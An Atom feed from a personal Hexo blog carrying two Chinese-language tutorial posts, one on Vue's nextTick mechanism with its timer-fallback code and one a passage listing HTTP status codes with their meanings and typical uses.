<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HELLO</title>
  
  <subtitle>It is never too late to learn</subtitle>
  <link href="https://zhouhang-hello.gitee.io/hexo_blog/atom.xml" rel="self"/>
  
  <link href="https://zhouhang-hello.gitee.io/hexo_blog/"/>
  <updated>2021-10-11T17:18:29.539Z</updated>
  <id>https://zhouhang-hello.gitee.io/hexo_blog/</id>
  
  <author>
    <name>hello</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nexttick</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/08/nextTick/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/08/nextTick/</id>
    <published>2021-10-08T02:00:00.000Z</published>
    <updated>2021-10-11T17:18:29.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nexttick-sailboat"><a href="#nexttick-sailboat" class="headerlink" title="nexttick :sailboat:"></a>nexttick :sailboat:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nextTick可以让我们在下次 DOM 更新循环结束之后执行延迟回调，用于获得更新后的 DOM</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>这里主线程的执行过程就是一个<code>tick</code>，而所有的异步结果都是通过任务队列来调度。<code>Event Loop</code> 分为宏任务和微任务，无论是执行宏任务还是微任务，完成后都会进入到一下<code>tick</code>，<strong>并在两个<code>tick</code>之间进行UI渲染</strong>。</p><p>由于Vue DOM更新是异步执行的，即修改数据时，视图不会立即更新，而是会监听数据变化，并缓存在同一事件循环中，等同一数据循环中的所有数据变化完成之后，再统一进行视图更新。为了确保得到更新后的DOM，所以设置了 <code>Vue.nextTick()</code>方法。</p><ul><li>在 <code>Vue 2.4</code> 之前都是使用的 <code>microtasks</code>，但是<code>microtasks</code> 的优先级过高，在某些情况下可能会出现比事件冒泡更快的情况，但如果都使用 <code>macrotasks</code> 又可能会出现渲染的性能问题。所以在新版本中，会默认使用 <code>microtasks</code>，但在特殊情况下会使用 <code>macrotasks</code>，比如 <code>v-on</code>。</li><li>对于实现 <code>macrotasks</code> ，会先判断是否能使用 <code>setImmediate</code> ，不能的话降级为 <code>MessageChannel</code> ，以上都不行的话就使用 <code>setTimeout</code></li></ul><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> setImmediate !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp; isNative(setImmediate)) &#123;  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    setImmediate(flushCallbacks)  &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (  <span class="hljs-keyword">typeof</span> MessageChannel !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp;  (isNative(MessageChannel) ||    <span class="hljs-comment">// PhantomJS</span>    MessageChannel.toString() === <span class="hljs-string">&#x27;[object MessageChannelConstructor]&#x27;</span>)) &#123;  <span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> MessageChannel()  <span class="hljs-keyword">const</span> port = channel.port2  channel.port1.onmessage = flushCallbacks  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    port.postMessage(<span class="hljs-number">1</span>)  &#125;&#125; <span class="hljs-keyword">else</span> &#123;  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">setTimeout</span>(flushCallbacks, <span class="hljs-number">0</span>)  &#125;&#125;</code></pre></div><h2 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h2><ul><li><p>在Vue生命周期的</p><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">created</span><span class="hljs-params">()</span></span></code></pre></div><p>钩子函数进行的DOM操作一定要放在</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Vue</span>.</span></span>next<span class="hljs-constructor">Tick()</span></code></pre></div><p>的回调函数中。</p><p><strong>原因</strong>：是<code>created()</code>钩子函数执行时DOM其实并未进行渲染。</p></li><li><p>在数据变化后要执行的某个操作，而这个操作需要使用随数据改变而改变的DOM结构的时候，这个操作应该放在</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Vue</span>.</span></span>next<span class="hljs-constructor">Tick()</span></code></pre></div><p>的回调函数中。</p><p><strong>原因</strong>：Vue异步执行DOM更新，只要观察到数据变化，Vue将开启一个队列，并缓冲在同一事件循环中发生的所有数据改变，如果同一个watcher被多次触发，只会被推入到队列中一次。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用<code>Vue.nextTick()</code>是为了可以获取更新后的DOM 。<br>触发时机：在同一事件循环中的数据变化后，DOM完成更新，立即执行<code>Vue.nextTick()</code>的回调。</p><blockquote><p>同一事件循环中的代码执行完毕 -&gt; DOM 更新 -&gt; nextTick callback触发</p></blockquote>]]></content>
    
    
    <summary type="html">nextTick可以让我们在下次 DOM 更新循环结束之后执行延迟回调，用于获得更新后的 DOM - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>网络状态码</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/07/%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/07/%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2021-10-07T02:00:00.000Z</published>
    <updated>2021-10-11T17:01:29.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络状态码"><a href="#网络状态码" class="headerlink" title="网络状态码"></a>网络状态码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>http状态码的由三位数字和原因短语组成，数字的第一位数字表示响应的类别，后面两位无类别。以下有五种类别。另外只要遵循状态码类别的定义，即使改变RFC2616中定义的状态码，或者服务端自行创建状态码都可以。</p><p>1XX</p><ul><li>类别：informational 信息性状态码</li><li>原因短语：接收的请求正在处理</li></ul><p>2XX</p><ul><li>类别：success 成功状态码</li><li>原因短语：请求正常处理完毕</li></ul><p>3XX</p><ul><li>类别：redirection 重定向状态码</li><li>原因短语：需要进行附加操作以完成请求</li></ul><p>4XX</p><ul><li>类别：client error 客户端错误状态码</li><li>原因短语：服务器无法处理请求</li></ul><p>5XX</p><ul><li>类别：server error 服务器错误状态码</li><li>原因短语：服务器处理请求出错</li></ul><h2 id="常见状态"><a href="#常见状态" class="headerlink" title="常见状态"></a>常见状态</h2><h2 id="1xx-Informational-信息响应"><a href="#1xx-Informational-信息响应" class="headerlink" title="1xx Informational 信息响应"></a>1xx Informational 信息响应</h2><p>1XX 是信息响应，表示接收的请求正在被处理。</p><h3 id="100-Continue-（继续）"><a href="#100-Continue-（继续）" class="headerlink" title="100 Continue （继续）"></a>100 Continue （继续）</h3><ul><li>响应结果：信息型状态响应码表示目前为止一切正常, 客户端应该继续请求, 如果已完成请求则忽略.</li><li>使用场景：为了让服务器检查请求的首部, 客户端必须在发送请求实体前, 在初始化请求中发送 Expect: 100-continue 首部并接收 100 Continue 响应状态码.</li></ul><h3 id="101-Switching-Protocols-（协议切换）"><a href="#101-Switching-Protocols-（协议切换）" class="headerlink" title="101 Switching Protocols （协议切换）"></a>101 Switching Protocols （协议切换）</h3><ul><li><p>响应结果：表示服务器应客户端升级协议的请求（Upgrade请求头）正在进行协议切换。服务器会发送一个Upgrade响应头来表示其正在切换过去的协议。</p></li><li><p>使用场景：</p><p>在使用 WebSockets 时会用到协议切换。</p></li></ul><h2 id="2xx-Successful-成功响应"><a href="#2xx-Successful-成功响应" class="headerlink" title="2xx Successful 成功响应"></a>2xx Successful 成功响应</h2><p>2XX 表示请求被正常处理了。</p><h3 id="200-OK-（成功）"><a href="#200-OK-（成功）" class="headerlink" title="200 OK （成功）"></a>200 OK （成功）</h3><ul><li>响应结果：请求成功，表示客户端发来的请求在服务端被正常处理了。</li><li>不同的请求方法对请求成功的意义不同：</li><li><ul><li>GET方法请求时，对应的请求资源实体会作为响应返回；</li></ul></li><li><ul><li>HEAD方法请求时，对应请求资源的实体首部不随报文主体作为响应返回，即响应中只返回首部，不返回实体的主体部分；</li></ul></li><li><ul><li>POST方法请求时，响应的消息体重包含请求的结果</li></ul></li></ul><h3 id="201-Created-（已创建）"><a href="#201-Created-（已创建）" class="headerlink" title="201 Created （已创建）"></a>201 Created （已创建）</h3><ul><li>响应结果：该请求已成功，并因此创建了一个新的资源。</li><li>使用场景：作为PUT请求的返回值。</li></ul><h3 id="202-Accepted（已接受）"><a href="#202-Accepted（已接受）" class="headerlink" title="202 Accepted（已接受）"></a>202 Accepted（已接受）</h3><ul><li>响应结果：服务端收到请求，但未处理。</li><li>使用场景：这个状态码被设计用来将请求交由另外一个进程或者服务器来进行处理，或者是对请求进行批处理的情形。</li></ul><h3 id="203-Non-Authoritative-Information（非权威信息）"><a href="#203-Non-Authoritative-Information（非权威信息）" class="headerlink" title="203 Non-Authoritative Information（非权威信息）"></a>203 Non-Authoritative Information（非权威信息）</h3><ul><li>响应结果：服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。</li><li>使用场景：通过代理访问原始服务器的时候，成功获取了原始服务器（状态码200）的返回内容，但是代理对内容作出了一些改动，代理会通过这个状态码告知用户，成功获取内容，但是这部分内容和原始服务器的返回内容可能不完全一致。</li></ul><h3 id="204-No-Content-没有内容"><a href="#204-No-Content-没有内容" class="headerlink" title="204 No Content (没有内容)"></a>204 No Content (没有内容)</h3><ul><li>响应结果：服务器成功处理了客户端请求，但服务器无返回内容。204是HTTP中数据量最少的响应状态，204的响应中没有body，而且Content-Length=0。</li><li>使用场景：204状态在一些网站分析的代码中最常用到，只需要把客户端的一些信息提交给服务器而无需关心响应。</li></ul><h3 id="205-Reset-Content-重置内容"><a href="#205-Reset-Content-重置内容" class="headerlink" title="205 Reset Content (重置内容)"></a>205 Reset Content (重置内容)</h3><ul><li>响应结果：服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。</li><li>使用场景：用来通知客户端重置文档视图，比如清空表单内容、重置 canvas 状态或者刷新用户界面。</li></ul><h3 id="206-Partial-Content-（部分内容）"><a href="#206-Partial-Content-（部分内容）" class="headerlink" title="206 Partial Content （部分内容）"></a>206 Partial Content （部分内容）</h3><ul><li>响应结果：表示客户端进行了范围请求，而服务器成功执行了这部分GET请求。响应报文中包含由Content-Range指定范围的实体内容。</li><li>使用场景：类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件</li></ul><h2 id="3xx-Redirection-重定向"><a href="#3xx-Redirection-重定向" class="headerlink" title="3xx Redirection 重定向"></a>3xx Redirection 重定向</h2><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确的处理请求。</p><h3 id="300-Multiple-Choices-（多项选择）"><a href="#300-Multiple-Choices-（多项选择）" class="headerlink" title="300 Multiple Choices （多项选择）"></a>300 Multiple Choices （多项选择）</h3><ul><li>响应结果：是一个用来表示重定向的响应状态码，表示该请求拥有多种可能的响应。用户代理或者用户自身应该从中选择一个。</li><li>使用场景：由于没有如何进行选择的标准方法，这个状态码极少使用。</li></ul><h3 id="301-Moved-Permanently（永久性重定向"><a href="#301-Moved-Permanently（永久性重定向" class="headerlink" title="301 Moved Permanently（永久性重定向)"></a>301 Moved Permanently（永久性重定向)</h3><ul><li>响应结果：表示请求的资源已被分配了新的URL，以后应使用现在所指的URL。也就是说如果已经吧资源对应的URL保存为书签了，这时应该按Location首部字段提示的URL重新保存。</li><li>使用场景：</li><li><ul><li>域名到期不想续费（或者发现了更适合网站的域名），想换个域名。</li></ul></li><li><ul><li>在搜索引擎的搜索结果中出现了不带www的域名，而带www的域名却没有收录，这个时候可以用301重定向来告诉搜索引擎我们目标的域名是哪一个。</li></ul></li><li><ul><li>空间服务器不稳定，换空间的时候。</li></ul></li></ul><h3 id="302-Found（临时性重定向）"><a href="#302-Found（临时性重定向）" class="headerlink" title="302 Found（临时性重定向）"></a>302 Found（临时性重定向）</h3><ul><li>响应结果：该状态码表示请求的资源已被分配了新的URL，希望用户（本次）能使用新的URL访问。</li><li>使用场景：尽量使用301！</li></ul><h3 id="303-See-Other（参见其他）"><a href="#303-See-Other（参见其他）" class="headerlink" title="303 See Other（参见其他）"></a>303 See Other（参见其他）</h3><ul><li>响应结果：表示由于请求对应的资源存在这另一个URL，应使用GET方法定向获取请求的资源。303与302不同之处在于，302是不会改变请求的方法，如果请求方法是POST的话，重定向的请求也应该是POST。而对于303，使用POST请求的话，重定向的请求应该是GET请求。</li><li>使用场景：未知。</li></ul><h3 id="304-Not-Modified（未修改）"><a href="#304-Not-Modified（未修改）" class="headerlink" title="304 Not Modified（未修改）"></a>304 Not Modified（未修改）</h3><p>响应结果：该状态码表示客户端发送附带条件的请求（指采用GET方法的请求报文中包含）时，服务器端允许请求访问资源，但未满足条件的情况。304状态码返回时，不包含任何响应的主体。304虽然在3xx类别中，但是和重定向没关系。</p><ul><li>使用场景：在 Web 页面中查看任务详情时，要求能够不刷新页面便自动的更新它的状态与日志等信息（任务的执行会花费一定的时间，同时后台在处理任务的过程中会同步它的状态与日志的更新）。因为任务的状态更新可接受短暂的延时，所以不必采用长连接的方式，客户端只需要定时往服务器发送获取数据的请求即可，但是任务的数据量较大，如果任务并未发生改变，就查询它全部的相关信息并返回到客户端对性能而言必然不是最优的选择，所以我们需要在它发生改变后才查询并返回数据，那么这里就可以引入 304 状态码来解决任务无变化时的返回结果。</li></ul><h3 id="305-Use-Proxy-（使用代理）"><a href="#305-Use-Proxy-（使用代理）" class="headerlink" title="305 Use Proxy （使用代理）"></a>305 Use Proxy （使用代理）</h3><ul><li>响应结果：被请求的资源必须通过指定的代理才能被访问。</li><li>使用场景：未知。</li></ul><h3 id="306-Unused"><a href="#306-Unused" class="headerlink" title="306 (Unused)"></a>306 (Unused)</h3><p>在最新版的规范中，306状态码已经不再被使用。</p><h3 id="307-Temporary-Redirect-（临时重定向）"><a href="#307-Temporary-Redirect-（临时重定向）" class="headerlink" title="307 Temporary Redirect （临时重定向）"></a>307 Temporary Redirect （临时重定向）</h3><ul><li>响应结果：该状态码与302有着相同的含义。尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守。307会遵照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</li><li>使用场景：同302</li></ul><h3 id="308-Permanent-Redirect（永久重定向）"><a href="#308-Permanent-Redirect（永久重定向）" class="headerlink" title="308 Permanent Redirect（永久重定向）"></a>308 Permanent Redirect（永久重定向）</h3><ul><li>响应结果：是表示重定向的响应状态码，说明请求的资源已经被永久的移动到了由 Location 首部指定的 URL 上。浏览器会进行重定向，同时搜索引擎也会更新其链接（用 SEO 的行话来说，意思是链接汁被传递到了新的 URL）。在重定向过程中，请求方法和消息主体不会发生改变，然而在返回 301 状态码的情况下，请求方法有时候会被客户端错误地修改为 GET 方法。</li><li>使用场景：一些 Web 应用可能会将 308 Permanent Redirect 以一种非标准的方式使用以及用作其他用途。例如，Google Drive 会使用 308 Resume Incomplete 状态码来告知客户端文件上传终止且不完整。</li></ul><h2 id="4xx-Client-Error客户端响应"><a href="#4xx-Client-Error客户端响应" class="headerlink" title="4xx Client Error客户端响应"></a>4xx Client Error客户端响应</h2><p>4XX的响应结果表明客户端是发生错误的原因所在。</p><h3 id="400-Bad-Request（坏请求）"><a href="#400-Bad-Request（坏请求）" class="headerlink" title="400 Bad Request（坏请求）"></a>400 Bad Request（坏请求）</h3><ul><li>响应结果：该状态码表示请求报文中存在语法错误。当错误发生时，需要修改请求的内容后再次发送请求。另外，浏览器会像200OK一样对待该状态码。</li><li>出现原因：语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。请求参数有误。</li></ul><h3 id="401-Unauthorized（未授权）"><a href="#401-Unauthorized（未授权）" class="headerlink" title="401 Unauthorized（未授权）"></a>401 Unauthorized（未授权）</h3><p>-响应结果：表示发送的请求需要有通过HTTP认证的认证信息。另外若之前已进行过一次请求，则表示用户认证失败。返回含有401响应必须包含一个适用于被请求资源的WWW-Authenticate 首部用以质询用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><ul><li>出现原因：客户端错误，指的是由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。</li></ul><h3 id="402-Payment-Required（要求付款）"><a href="#402-Payment-Required（要求付款）" class="headerlink" title="402 Payment Required（要求付款）"></a>402 Payment Required（要求付款）</h3><ul><li>响应结果：此响应码保留以便将来使用，创造此响应码的最初目的是用于数字支付系统，然而现在并未使用。</li></ul><h3 id="403-Forbidden-（禁止）"><a href="#403-Forbidden-（禁止）" class="headerlink" title="403 Forbidden （禁止）"></a>403 Forbidden （禁止）</h3><ul><li>响应结果：对请求资源的访问服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主题部分对原因进行描述，这样就能让用户看到了。</li><li>出现原因：未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP地址试图访问）等列举情况都可能是发生403的原因。</li></ul><h3 id="404-Not-Found（未找到）"><a href="#404-Not-Found（未找到）" class="headerlink" title="404 Not Found（未找到）"></a>404 Not Found（未找到）</h3><ul><li>响应结果：表明服务器上无法找到请求的资源。</li><li>使用场景：服务器找不到资源时，或者服务器拒绝请求又不想说明理由时。</li></ul><h3 id="405-Method-Not-Allowed（不允许使用的方法）"><a href="#405-Method-Not-Allowed（不允许使用的方法）" class="headerlink" title="405 Method Not Allowed（不允许使用的方法）"></a>405 Method Not Allowed（不允许使用的方法）</h3><ul><li>响应结果：请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</li><li>出现原因：鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</li></ul><h3 id="406-Not-Acceptable（无法接受）"><a href="#406-Not-Acceptable（无法接受）" class="headerlink" title="406 Not Acceptable（无法接受）"></a>406 Not Acceptable（无法接受）</h3><ul><li>响应结果：表示客户端错误，指代服务器端无法提供与 Accept-Charset 以及 Accept-Language 消息头指定的值相匹配的响应</li><li>出现原因：在实际应用中，这个错误状态码极少使用：不是给用户返回一个晦涩难懂（且难以更正）的错误状态码，而是将相关的消息头忽略，同时给用户提供一个看得见摸得着的页面。这种做法基于这样一个假设：即便是不能达到用户十分满意，也强于返回错误状态码。</li></ul><p>如果服务器返回了这个错误状态码，那么消息体中应该包含所能提供的资源表现形式的列表，允许用户手动进行选择。</p><h3 id="407-Proxy-Authentication-Required-要求进行代理认证"><a href="#407-Proxy-Authentication-Required-要求进行代理认证" class="headerlink" title="407 Proxy Authentication Required(要求进行代理认证)"></a>407 Proxy Authentication Required(要求进行代理认证)</h3><ul><li>响应结果：代表客户端错误，指的是由于缺乏位于浏览器与可以访问所请求资源的服务器之间的代理服务器（proxy server ）要求的身份验证凭证，发送的请求尚未得到满足。</li><li>使用场景：这个状态码会与 Proxy-Authenticate 首部一起发送，其中包含有如何进行验证的信息。</li></ul><h3 id="408-Request-Timeout（请求超时）"><a href="#408-Request-Timeout（请求超时）" class="headerlink" title="408 Request Timeout（请求超时）"></a>408 Request Timeout（请求超时）</h3><ul><li>响应结果：遇到408意味着你的请求发送到该网站花的时间比该网站的服务器准备等待的时间要长，即链接超时。408错误往往难以解决，通常涉及系统工作量或系统操作中的一次性变化。</li><li>出现原因：如果用户持续看到408错误，管理员首先要考虑到Web服务器的工作量，特别是在产生408错误的时间段，另外网络流量激增也可能导致用户无法访问网页从而出现该错误。</li></ul><h3 id="409-Conflict（冲突）"><a href="#409-Conflict（冲突）" class="headerlink" title="409 Conflict（冲突）"></a>409 Conflict（冲突）</h3><ul><li>响应结果：表示请求与当前服务器端的状态相冲突。</li><li>出现原因：冲突最有可能发生在对 PUT 请求的响应中。例如，当上传文件的版本比服务器上已存在的要旧，从而导致版本冲突的时候，那么就有可能收到状态码为 409 的响应。</li></ul><h3 id="410-Gone（消失了）"><a href="#410-Gone（消失了）" class="headerlink" title="410 Gone（消失了）"></a>410 Gone（消失了）</h3><ul><li>响应结果：说明请求的内容在服务器上不存在了，同时是永久性的丢失。如果不清楚是否为永久或临时的丢失，应该使用404 。</li></ul><h3 id="411-Length-Required（要求长度指示）"><a href="#411-Length-Required（要求长度指示）" class="headerlink" title="411 Length Required（要求长度指示）"></a>411 Length Required（要求长度指示）</h3><ul><li>响应结果：属于客户端错误，表示由于缺少确定的Content-Length 首部字段，服务器拒绝客户端的请求。</li></ul><h3 id="412-Precondition-Failed（先决条件失败）"><a href="#412-Precondition-Failed（先决条件失败）" class="headerlink" title="412 Precondition Failed（先决条件失败）"></a>412 Precondition Failed（先决条件失败）</h3><ul><li>响应结果:（先决条件失败）表示客户端错误，意味着对于目标资源的访问请求被拒绝。</li><li>出现场景：这通常发生于采用除 GET 和 HEAD 之外的方法进行条件请求时，由首部字段 If-Unmodified-Since 或 If-None-Match 规定的先决条件不成立的情况下。这时候，请求的操作——通常是上传或修改文件——无法执行，从而返回该错误状态码。</li></ul><h3 id="413-Payload-Too-Large（请求实体太大）"><a href="#413-Payload-Too-Large（请求实体太大）" class="headerlink" title="413 Payload Too Large（请求实体太大）"></a>413 Payload Too Large（请求实体太大）</h3><ul><li>响应结果：表示请求主体的大小超过了服务器规定的限度，服务器可以选择关闭连接或者返回 Retry-After 首部字段。</li></ul><h3 id="414-URI-Too-Long（请求URI太长）"><a href="#414-URI-Too-Long（请求URI太长）" class="headerlink" title="414 URI Too Long（请求URI太长）"></a>414 URI Too Long（请求URI太长）</h3><ul><li>响应结果：表示客户端所请求的 URI 超过了服务器允许的范围。</li><li>出现原因：</li><li><ul><li>当客户端误将 POST 请求当作 GET 请求的时候，会带有一个常常的查询字符串(query)；</li></ul></li><li><ul><li>when the client has descended into a loop of redirection (for example, a redirected URI prefix that points to a suffix of itself)</li></ul></li><li><ul><li>当客户端对服务器进行攻击，试图寻找潜在的漏洞的时候。</li></ul></li></ul><h3 id="415-Unsupported-Media-Type（不支持的媒体类型）"><a href="#415-Unsupported-Media-Type（不支持的媒体类型）" class="headerlink" title="415 Unsupported Media Type（不支持的媒体类型）"></a>415 Unsupported Media Type（不支持的媒体类型）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器由于不支持其有效载荷的格式，从而拒绝接受客户端的请求。</li><li>出现原因：格式问题的出现有可能源于客户端在 Content-Type 或 Content-Encoding 首部中指定的格式，也可能源于直接对负载数据进行检测的结果。</li></ul><h3 id="416-Requested-Range-Not-Satisfiable-（所请求的范围未得到满足）"><a href="#416-Requested-Range-Not-Satisfiable-（所请求的范围未得到满足）" class="headerlink" title="416 Requested Range Not Satisfiable （所请求的范围未得到满足）"></a>416 Requested Range Not Satisfiable （所请求的范围未得到满足）</h3><ul><li>响应结果：服务器无法处理所请求的数据区间，最常见的情况是所请求的数据区间不在文件范围之内。一则 416 应答消息包含有一个 Content-Range 首部，提示无法满足的数据区间（用星号 * 表示），后面紧跟着一个“/”，再后面是当前资源的长度。例如：</li></ul><p>遇到这一错误状态码的时候，浏览器一般有两种策略：一种是终止操作，例如，一项中断的下载操作被认为是不可恢复的；另外一种是再次请求整个文件。</p><h3 id="417-Expectation-Failed（无法满足期望）"><a href="#417-Expectation-Failed（无法满足期望）" class="headerlink" title="417 Expectation Failed（无法满足期望）"></a>417 Expectation Failed（无法满足期望）</h3><ul><li>响应结果：客户端错误，意味着服务器无法满足 Expect 请求消息头中的期望条件。</li></ul><h3 id="426-Upgrade-Required（需要升级）"><a href="#426-Upgrade-Required（需要升级）" class="headerlink" title="426 Upgrade Required（需要升级）"></a>426 Upgrade Required（需要升级）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器拒绝处理客户端使用当前协议发送的请求，但是可以接受其使用升级后的协议发送的请求。</li></ul><p>服务器会在响应中使用 Upgrade 首部来指定要求的协议。</p><h3 id="428-Precondition-Required（先决条件要求）"><a href="#428-Precondition-Required（先决条件要求）" class="headerlink" title="428 Precondition Required（先决条件要求）"></a>428 Precondition Required（先决条件要求）</h3><ul><li>响应结果：表示服务器端要求发送条件请求。</li><li>出现原因：一般的，这种情况意味着必要的条件首部——如 If-Match ——的缺失。.</li></ul><p>当一个条件首部的值不能匹配服务器端的状态的时候，应答的状态码应该是 412 Precondition Failed，前置条件验证失败。</p><h3 id="429-Too-Many-Requests（请求太多）"><a href="#429-Too-Many-Requests（请求太多）" class="headerlink" title="429 Too Many Requests（请求太多）"></a>429 Too Many Requests（请求太多）</h3><p>表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”。</p><h3 id="431-Request-Header-Fields-Too-Large"><a href="#431-Request-Header-Fields-Too-Large" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><ul><li>响应主体：表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”。在响应中，可以提供一个 Retry-After 首部来提示用户需要等待多长时间之后再发送新的请求。</li></ul><h3 id="431-Request-Header-Fields-Too-Large-1"><a href="#431-Request-Header-Fields-Too-Large-1" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><ul><li>响应主体：表示由于请求中的首部字段的值过大，服务器拒绝接受客户端的请求。客户端可以在缩减首部字段的体积后再次发送请求。</li><li>应用场景：该响应码可以用于首部总体体积过大的情况，也可以用于单个首部体积过大的情况。<br>这种错误不应该出现于经过良好测试的投入使用的系统当中，而是更多出现于测试新系统的时候</li></ul><h3 id="451-Unavailable-For-LegalReason（因法律原因不可用）"><a href="#451-Unavailable-For-LegalReason（因法律原因不可用）" class="headerlink" title="451 Unavailable For LegalReason（因法律原因不可用）"></a>451 Unavailable For LegalReason（因法律原因不可用）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器由于法律原因，无法提供客户端请求的资源，例如可能会导致法律诉讼的页面。</li></ul><h2 id="5xx-Server-Error-服务器错误"><a href="#5xx-Server-Error-服务器错误" class="headerlink" title="5xx Server Error 服务器错误"></a>5xx Server Error 服务器错误</h2><p>5XX 响应结果表明服务器本身发生错误。</p><h3 id="500-Internal-Server-Error（内部资源出错）"><a href="#500-Internal-Server-Error（内部资源出错）" class="headerlink" title="500 Internal Server Error（内部资源出错）"></a>500 Internal Server Error（内部资源出错）</h3><ul><li>响应结果：表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。</li><li>解决方案：这个错误代码是一个通用的“全方位”响应代码。通常服务器管理员对于类似于 500 这样的错误会更加详细地记录相关的请求信息来防止以后同样错误的出现。</li></ul><h3 id="501-Not-Implemented-服务器不支持"><a href="#501-Not-Implemented-服务器不支持" class="headerlink" title="501 Not Implemented(服务器不支持)"></a>501 Not Implemented(服务器不支持)</h3><ul><li>响应结果：服务器错误响应码表示请求的方法不被服务器支持，因此无法被处理。服务器必须支持的方法（即不会返回这个状态码的方法）只有 GET 和 HEAD。</li><li>解决方法：你无法修复 501 错误，需要被访问的 web 服务器去修复该问题。</li></ul><h3 id="502-Bad-Gateway-错误状态"><a href="#502-Bad-Gateway-错误状态" class="headerlink" title="502 Bad Gateway(错误状态)"></a>502 Bad Gateway(错误状态)</h3><ul><li>响应结果：是一种HTTP协议的服务器端错误状态代码，它表示扮演网关或代理角色的服务器，从上游服务器中接收到的响应是无效的。</li><li>解决方法：502 错误通常不是客户端能够修复的，而是需要由途径的Web服务器或者代理服务器对其进行修复。</li></ul><h3 id="503-Service-Unavailable-超负载"><a href="#503-Service-Unavailable-超负载" class="headerlink" title="503 Service Unavailable(超负载)"></a>503 Service Unavailable(超负载)</h3><ul><li>响应结果：表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的视觉，最好写入Retry-After首部字段在返回给客户端。</li><li>出现原因：在服务器503错误出现了之后，大家不必担心的， 服务器或许就是正在维护或者暂停了，你可以联系一下服务器空间商。还有的时候cpu占用的频率大导致的。</li></ul><h3 id="504-Gateway-Timeout（网关超时）"><a href="#504-Gateway-Timeout（网关超时）" class="headerlink" title="504 Gateway Timeout（网关超时）"></a>504 Gateway Timeout（网关超时）</h3><ul><li>响应结果：与状态吗408类似， 但是响应来自网关或代理，此网关或代理在等待另一台服务器的响应时出现了超时</li></ul><h3 id="505-HTTP-Version-Not-Supported（不支持的HTTP版本）"><a href="#505-HTTP-Version-Not-Supported（不支持的HTTP版本）" class="headerlink" title="505 HTTP Version Not Supported（不支持的HTTP版本）"></a>505 HTTP Version Not Supported（不支持的HTTP版本）</h3><ul><li>响应结果：服务器收到的请求使用了它不支持的HTTP协议版本。 有些服务器不支持HTTP早期的HTTP协议版本，也不支持太高的协议版本</li></ul><h3 id="511-Network-Authentication-Required"><a href="#511-Network-Authentication-Required" class="headerlink" title="511 Network Authentication Required"></a>511 Network Authentication 